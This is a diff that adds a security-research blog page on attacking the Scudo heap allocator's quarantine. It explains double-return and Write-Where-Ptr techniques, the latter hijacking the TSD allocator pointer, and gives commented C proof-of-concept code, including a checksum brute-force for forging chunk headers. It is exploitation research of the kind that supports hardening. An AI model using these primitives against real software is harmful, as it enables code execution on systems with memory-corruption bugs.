@@ -1,0 +1,524 @@
+<html>
+<head>
+<link rel="icon" href="icon.png">
+<title> un1fuzz ~</title>
+<meta charset="utf-8">
+<style>
+    body {
+      color: #FEFEFE;
+      background-color: #0c0d04;
+      margin: 0 auto;
+      padding: 1em 0 1em 0;
+    }
+@font-face { font-family: "gohu"; src: url("../gohu.woff") format('woff'); }
+       pre { font-family: "gohu", "Lucida Console", monospace, Monaco; font-size: 24px; line-height: 1.0; }
+         a { color: #93ffd7; text-decoration: none; }
+</style>
+</head>
+<body>
+<center><div style="display: inline-block; text-align: center;"><pre>
+
+<a href="../index.html">[Main]</a> <a href="../articles.html">[Articles]</a> <a href="../about.html">[About]</a>
+
+<center><div style="display: inline-block; text-align: left;"><pre>
+
+    ~ Attacking Scudo's Quarantine ~
+
+    --[ Table of contents
+      <span style="color:#e90e0e">1</span> - Set up
+      <span style="color:#e90e0e">2</span> - Double Return Attack
+      <span style="color:#e90e0e">2.1</span> - Theory
+      <span style="color:#e90e0e">2.2</span> - Practice
+      <span style="color:#e90e0e">3</span> - Write Where Ptr
+      <span style="color:#e90e0e">3.1</span> - Theory
+      <span style="color:#e90e0e">3.2</span> - Practice
+      <span style="color:#e90e0e">4</span> - Un-Quarantine faster
+      <span style="color:#e90e0e">5</span> - Conclusion
+    ~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~.~
+
+<center><div style="display: inline-block; text-align: left;"><pre>
+
+    --[ 1 - Set up
+    We enable Quarantine with the following environment variable:
+    SCUDO_OPTIONS="thread_local_quarantine_size_kb=64:quarantine_size_kb=256:quarantine_max_chunk_size=2048"
+
+    --[ 2 - Double Return Attack
+    This technique will allow an attacker to escalate some primitives to make
+    the allocator return the same chunk twice.
+
+    ---[ 2.1 - Theory
+    It relies on the fact that QuaranineBatch structures get returned directly
+    to the backend when deallocated and their contents aren't initialized.
+
+    When 2 QuarantineBatch structures get merged together, the one that didn't
+    receive the extra nodes will be deallocated later in the recycling process;
+
+    ---------------------------------- quarantine.h ----------------------------------
+
+    void mergeBatches(QuarantineCache *ToDeallocate) {
+      ...
+        if (Current-&gt;canMerge(Current-&gt;Next)) {
+          QuarantineBatch *Extracted = Current-&gt;Next;
+          // Move all the chunks into the current batch.
+          Current-&gt;merge(Extracted);
+          ...
+          ToDeallocate-&gt;enqueueBatch(Extracted);
+        ...
+      ...
+    }
+    ----------------------------------------------------------------------------------
+    void merge(QuarantineBatch *const From) {
+      ...
+      From-&gt;Count = 0;
+      From-&gt;Size = sizeof(QuarantineBatch);
+    }
+    ----------------------------------------------------------------------------------
+
+    Since Count is set to 0 that means that even though this QuarantineBatch is
+    enqueued in ToDeallocate, which will be used later in doRecycle, it will just
+    get deallocated and none of its nodes will get recycled;
+
+    ---------------------------------- quarantine.h ----------------------------------
+
+    void NOINLINE doRecycle(CacheT *C, Callback Cb) {
+      while (QuarantineBatch *B = C-&gt;dequeueBatch()) {
+        const u32 Seed = static_cast&lt;u32&gt;(
+            (reinterpret_cast&lt;uptr&gt;(B) ^ reinterpret_cast&lt;uptr&gt;(C)) &gt;&gt; 4);
+        B-&gt;shuffle(Seed);
+        ...
+        for (uptr I = 0, Count = B-&gt;Count; I &lt; Count; I++) { // &lt;- see here
+          ...
+          Cb.recycle(reinterpret_cast&lt;Node *&gt;(B-&gt;Batch[I]));
+        }
+        Cb.deallocate(B); // [1]
+      }
+    }
+    ----------------------------------------------------------------------------------
+
+    Thus if a new QuarantineBatch is created after [1], it may hold the contents
+    of the QuarantineBatch that was merged with another one.
+    So the same chunk may exist on 2 QuarantineBatch structures at the same time.
+
+    The problem of course is that we need to fix the Count variable so that it
+    includes the chunk we want to return twice. Moreover when it is returned the
+    first time we should fix its header too to make it look it's quarantined again
+    so the program doesn't abort.
+
+
+    We need to set up the QuarantineBatches in such a way that the following loop
+    in recycle(uptr MinSize, Callback Cb) doesn't enqueue both QuarantineBatches;
+
+    ---------------------------------- quarantine.h ----------------------------------
+
+    // Extract enough chunks from the quarantine to get below the max
+    // quarantine size and leave some leeway for the newly quarantined chunks.
+
+    while (Cache.getSize() &gt; MinSize)
+      Tmp.enqueueBatch(Cache.dequeueBatch());
+    ----------------------------------------------------------------------------------
+
+    If both of them get enqueued we won't be able to fix the header of the chunk
+    after it gets recycled the first time and scudo will abort when trying to return
+    it for the second time.
+    To achieve that some QuarantineBatch feng shui is essential.
+    Here is a pattern that will do the job (each block represents a QuarantineBatch structure);
+
++++++++++++++GRAPH+HERE+++++++++++
+
+
+The above is the state of the QuarantineBatches linked list before it will merge Qbatch_1 & Qbatch_2.
+
+    ---[ 2.2 - Practice
+
+    Here I will drop a small commented POC for this technique.
+
+    -------------------------------------- poc.c --------------------------------------
+
+    #include &lt;stdio.h&gt;
+    #include &lt;stdlib.h&gt;
+    #include &lt;stddef.h&gt;
+
+    #define CRC32_(crc, value) __asm__("crc32\t" "(%1), %0" : "=r"(crc) : "r"(value), "0"(crc))
+    size_t *x;
+
+    // fill a QBatch by hitting the 1019 Count limit
+    void fill_3(){
+    	for(int i=0;i&lt;1019; i++) {
+    		free(malloc(1));
+    	}
+    }
+
+    // fill a QBatch and forge the chunk we want to return twice
+    void fill_2(size_t *ptr, size_t size, size_t count){
+    	fill_qbatch(count-1, size);
+    	free(ptr);
+    }
+
+    // fill a QBatch by hitting the Size limit and control the value of Count
+    void fill_qbatch(size_t n, size_t y){
+    	size_t x = (0x10000-8176-y)+1;
+    	size_t *tmp=0;
+    	int zp = n - (x % n);
+    	int pp = x/n;
+    	for(int i=0;i&lt;n;i++) {
+    		if(i&gt;=zp){
+    			tmp = malloc(pp + 1);
+    		}else{
+    			tmp = malloc(pp);
+    		}
+    		free(tmp);
+    	}
+    }
+    u_int32_t crc32(u_int32_t crc, void const *buf) {
+            size_t crc0 = crc;
+            CRC32_(crc0, &buf);
+            return crc0;
+    }
+
+    // Calculating the correct header only requires
+    // you to know the checksum of the header while it is in use.
+    size_t find_cksum(size_t cksum_inuse){ // Checksum while chunk is in use.
+    	unsigned int i=0;
+            unsigned int _crc = 0;
+            char *chunk_ptr = 0x41414141; // Doesn't really matter as you can guess. (Since it's constant)
+            do{
+                    i++;
+                    _crc = crc32(crc32(i, chunk_ptr), 0x10101);
+                    _crc = _crc ^ _crc&gt;&gt;0x10;
+            }while(_crc!=cksum_inuse);
+            _crc = crc32(crc32(i, chunk_ptr), 0x10201);
+            _crc = _crc ^ _crc&gt;&gt;0x10;
+            return _crc&0xffff;
+
+    }
+    int main(){
+    	//printf("PID: %ld\n\n", (long)getpid());
+    	// scudo allocator 101 ;)
+    	size_t *y, *z;
+    	u_int32_t cksum_inuse, returned_once = 0;
+
+    	z = malloc(8176); // chunk in the same region as QuarantineBatches.
+                        // Will simulate a relative write bug on it.
+    	x = malloc(0x10); // Chunk we will try making the allocator return twice.
+                        // Size is randomly 0x10, any would work.
+                        // Will simulate we could read & corrupt its header.
+
+    	cksum_inuse = *(x-2)&gt;&gt;(8*6); // This simulates we are able to read its header.
+
+    	// QuarantineBatch fengshui
+    	for(int j=0;j&lt;2; j++) {
+    		for(int i=0;i&lt;6; i++) {
+    			fill_3();
+    		}
+    		fill_qbatch(600, 0xd782);
+    	}
+
+    	fill_3();
+    	fill_qbatch(420, 8176+0x3fb); // Qbatch_1
+    	fill_2(x, 0x10, 451); // Qbatch_2
+    	for(int j=0;j&lt;2; j++) fill_3();
+
+    	fill_qbatch(450, (0x3fb+8176)*2); // new QBatch that will hold the old contents of Qbatch_2,
+                                        // the 451th node is X chunk.
+
+    	for(int i=0; i&lt;0x6; i++) fill_3();
+    	fill_qbatch(600, 0xd782);
+
+    	for(int i=0; i&lt;0xb; i++){          // Corrupting every QuarantineBatch's Count variable will
+    		*(z+0x2402+0x400*i) = 451; // work for this example, so we don't even need to know
+    	}                                  // the exact position of the target QuarantineBatch. Just
+    	                                   // corrupt most of them. It has very good chances to succeed.
+
+    	for(int i=0;i&lt;0x20000; i++){
+    		size_t *p = malloc(0x10);
+    		if(p==x) {
+    			if(returned_once){
+    				printf("[+] Achieved double return ;)\n");
+    				return;
+    			}
+    			returned_once = 1;
+    			printf("[!] Bruteforcing to find the correct checksum and fix it\n");
+    			*(x-2) = (find_cksum(cksum_inuse)&lt;&lt;(8*6))+0x10201; // Calculate correct cksum and
+                                                                   // set Quarantined header flag
+    		}
+    		free(malloc(0x123)); // Slowly repopulate Quarantine
+    	}
+    }
+    ----------------------------------------------------------------------------------
+
+    The PoC demonstrating the technique above can be found [<a href=https://github.com/un1fuzz/scudo_research/blob/main/quarantine_double_return.c target="_blank">here</a>]
+
+
+    --[ 3 - Write Where Ptr
+
+    With this technique you can make scudo return arbitrary blocks back to the process.
+
+    ---[ 3.1 Theory
+
+    When trying to quarantine a chunk, Quarantine.put() will be called.
+    And this is where the fun begins.
+    Let's have a look;
+
+    ---------------------------------- quarantine.h ----------------------------------
+
+    void put(CacheT *C, Callback Cb, Node *Ptr, uptr Size) {
+      C->enqueue(Cb, Ptr, Size);
+      if (C->getSize() > getCacheSize())
+        drain(C, Cb);
+    }
+    ----------------------------------------------------------------------------------
+
+    At this point, as already has been described in the internals, enqueue()
+    will put the block that is being freed into the quarantine. If quarantine happens to
+    exceed getCacheSize(), drain() will be called to return back to the allocator
+    some of the quarantined blocks.
+
+    For the attack described at this section we will focus only on enqueue().
+
+    ---------------------------------- quarantine.h ----------------------------------
+
+    void enqueue(Callback Cb, void *Ptr, uptr Size) {
+      if (List.empty() || List.back()->Count == QuarantineBatch::MaxCount) {
+        QuarantineBatch *B =
+            reinterpret_cast<QuarantineBatch *>(Cb.allocate(sizeof(*B)));
+        DCHECK(B);
+        B->init(Ptr, Size);
+        enqueueBatch(B);
+      } else {
+        List.back()->push_back(Ptr, Size);
+        addToSize(Size);
+      }
+    }
+    ----------------------------------------------------------------------------------
+
+    Here enqueue() will try to check whether the List is empty() or the Last
+    QuarantineBatch in the List is full. In any of those cases scudo will try to
+    allocate a new QuarantineBatch and enqueue it to the List.
+
+    On the other hand, it will just enqueue it to the Last QuarantineBatch of our List
+    using push_back function.
+
+    ---------------------------------- quarantine.h ----------------------------------
+
+    void push_back(void *Ptr, uptr Size) {
+        DCHECK_LT(Count, MaxCount); // Note that DCHECKs are debugging checks,
+                                    // not enabled on production.
+        Batch[Count++] = Ptr;
+        this->Size += Size;
+    }
+    ----------------------------------------------------------------------------------
+
+    By having the ability to overflow QuarantineBatches we can control the Count
+    field of any corrupted QuarantineBatch.
+
+    ---------------------------------- quarantine.h ----------------------------------
+
+    struct QuarantineBatch {
+      ...
+      QuarantineBatch *Next;
+      uptr Size;
+      u32 Count;
+      void *Batch[MaxCount];
+      ...
+    }
+    ----------------------------------------------------------------------------------
+
+    We can see that the Count field of a QuarantineBatch is an unsigned 32 bit
+    integer. If we were able to corrupt the Count field of the Last QurantineBatch
+    on the QuarantineCache we would have crafted a Write-Where-Ptr primitive
+    inside push_back()!
+
+        ...
+        Batch[Count++] = Ptr; // Count is controllable!
+        ...
+
+    This primitive is kind of similar in what you gain with the unsortedbin/largebin
+    attacks in the glibc's ptmalloc2 allocator. The only difference is that in our case
+    we are not so lucky to be able to write the Ptr anywhere we like. The Count field
+    is a 32 bit unsigned integer and hence we can't go backwards and also in a 64 bit
+    linux platform with the default configuration we can't really reach regions other
+    than the Quarantine region on the heap. And that's because each region in scudo
+    is 4GB of space!
+
+    But this is not the case for the 32 bit version of scudo and also interestingly
+    enough not the case on the Android/Trusty configuration in 64 bits. In the 32
+    bits version of scudo, a 32 bit integer is enough to reach any address on the
+    VA space.
+
+    For Android/Trusty configurations in 64 bits, it is possible due to the
+    smaller heap. For example in Android:
+
+        ...
+        #if SCUDO_CAN_USE_PRIMARY64
+            typedef SizeClassAllocator64<AndroidConfig> Primary;
+            static const uptr PrimaryRegionSizeLog = 28U;
+            typedef u32 PrimaryCompactPtrT;
+            static const uptr PrimaryCompactPtrScale = SCUDO_MIN_ALIGNMENT_LOG;
+            static const bool PrimaryEnableRandomOffset = true;
+            static const uptr PrimaryMapSizeIncrement = 1UL << 18;
+        #else
+        ...
+
+    Each region will be 256 MB. The total number of regions in the android config
+    is 33. Hence the total heap size will be 8448 MB ~= 8.5GB of space. Our 32 bit
+    relative write can reach up to 4GB * sizeof(int) = 16 GB. And hence other
+    shared libraries will be in our range.
+
+    This primitive can be used to compromise the Scudo allocator if we were pointing
+    Ptr against the TSD structure.
+
+    If we inspect the TSD structure in a debugger:
+    ...
+    type = struct scudo::TSD<scudo::Allocator<...>
+        public:
+            scudo::Allocator<...>::CacheT Cache;
+            scudo::Allocator<...>::QuarantineCacheT QuarantineCache;
+            ...
+        private:
+            scudo::HybridMutex Mutex;
+            scudo::atomic_uptr Precedence;
+        ...
+    } *
+    ...
+
+    We can see the corresponding Cache structure:
+
+    ...
+    struct scudo::SizeClassAllocatorLocalCache<scudo::SizeClassAllocator32<...>
+        private:
+            static const scudo::uptr NumClasses;
+            static const scudo::uptr BatchClassId;
+            scudo::SizeClassAllocatorLocalCache::PerClass PerClassArray[45];
+            scudo::LocalStats Stats;
+            SizeClassAllocator *Allocator;
+        ...
+    }
+    ...
+
+    You can spot that the Cache structure of the TSD holds a pointer to a
+    SizeClassAllocator object.
+
+      ...
+      type = class scudo::SizeClassAllocator32<scudo::DefaultConfig>
+      public:
+          scudo::AtomicOptions Options;
+      private:
+          static const scudo::uptr NumClasses;
+          static const scudo::uptr RegionSize;
+          static const scudo::uptr NumRegions;
+          static const scudo::u32 MaxNumBatches;
+          scudo::SizeClassAllocator32::SizeClassInfo SizeClassInfoArray[45];
+          ByteMap PossibleRegions;
+          scudo::atomic_s32 ReleaseToOsIntervalMs;
+          static const scudo::uptr MaxStashedRegions;
+          scudo::HybridMutex RegionsStashMutex;
+          scudo::uptr NumberOfStashedRegions;
+          scudo::uptr RegionsStash[4];
+          ...
+      } *
+      ...
+
+    The SizeClassAllocator object is very important because it holds all the
+    necessary information for the Cache! By actually hijacking this pointer
+    we can control the Cache!
+
+    We will use our Write-Where-Ptr to hijack this pointer and try to achieve
+    an arbitrary return primitive on scudo.
+
+    ---[ 3.2 Practice
+
+    -------------------------------------- poc.c --------------------------------------
+    #include &lt;stdio.h&gt;
+
+    char target[256];
+
+    int main() {
+
+        setbuf(stdin, NULL);
+        setbuf(stdout, NULL);
+        setbuf(stderr, NULL);
+
+        printf("libc @ %p\n", puts);
+        strcpy(target, "CAN YOU OVERWRITE ME PLZ?");
+
+        char* dumbAllocation = malloc(24);
+        char* fakeAllocator = malloc(0x800 - 0x10);
+
+        free(dumbAllocation); // dumbAllocation is now quarantined.
+
+        // this will allocate a 0x1000 block within the QuarantineBatch region.
+        char* overflow_chunk = malloc(0x1000 - 0x40);
+
+        printf("Overflow chunk: %p\n", overflow_chunk);
+
+        printf("Target @ %p\n", &target);
+
+        puts("Fake allocator: ");
+        read(0, fakeAllocator, 0x800 - 0x10);
+
+        gets(overflow_chunk); // Now we have to spray a little bit & be lucky
+                              // inorder to hit the Last QuarantineBatch.
+
+        // If those conditions are met, by forcing a chunk to be quarantined we
+        // gain a Write-Where-Ptr primitive. With this primitive we will try to
+        // corrupt the Allocator reference from the TSD. By this way we will be
+        // able to hijack almost everything.
+
+        // Trigger our Write-Where-Ptr
+        free(fakeAllocator);
+
+        // Here, if our attack was successful, we should override the target.
+        void *small_chunk = malloc(64);
+        strcpy(small_chunk, "YES I CAN!");
+
+        puts(target);
+
+        _Exit(0);
+        return 0;
+    }
+    ----------------------------------------------------------------------------------
+
+    The PoC demonstrating the technique above can be found [<a href=https://github.com/un1fuzz/scudo_research/tree/main/quarantine_arbitrary_return target="_blank">here</a>].
+
+    -[ 4 - Un-Quarantine faster
+
+    This is a fan trick that may help you. It was used in the Double-Return
+    technique.
+    You can make quarantine chunks get returned from quarantine faster by
+    just allocating and deallocating many chunks.
+    And here is a small PoC;
+
+    -------------------------------------- poc.c --------------------------------------
+
+    #include &lt;stdio.h&gt;
+
+    void populate(){
+	     for(int i=0; i<0x1000; i++){
+		       free(malloc(0x20+i)); // avoid freeing same sized chunks
+         }
+    }
+    int main(){
+	     char *ptr_we_like = malloc(0x10);
+	     free(ptr_we_like);
+	     // At this point there is no chance a next malloc(0x10)
+	     // will return the same pointer since it is quarantined.
+	     // But let's see what happens if we populate the quarantine;
+
+	     populate();
+	     if(malloc(0x10)==ptr_we_like) printf("[+] The chunk returned is the same!\n");
+
+     }
+
+    ----------------------------------------------------------------------------------
+
+    The PoC demonstrating the technique above can be found [<a href=https://github.com/un1fuzz/scudo_research/blob/main/fast_unquarantine.c target="_blank">here</a>].
+
+    -[ 5 - Conclusion
+
+    Attacking Quarantine was pretty interesting and we are sure someone
+    can come up with many more techniques since we didn't really dive into
+    other parts of it. Hope you liked them and found them interesting.
+    Please reach us out if you found any mistakes/typos in this article
+    it will be much appreciated!
+
+</pre></div></center></body></html>
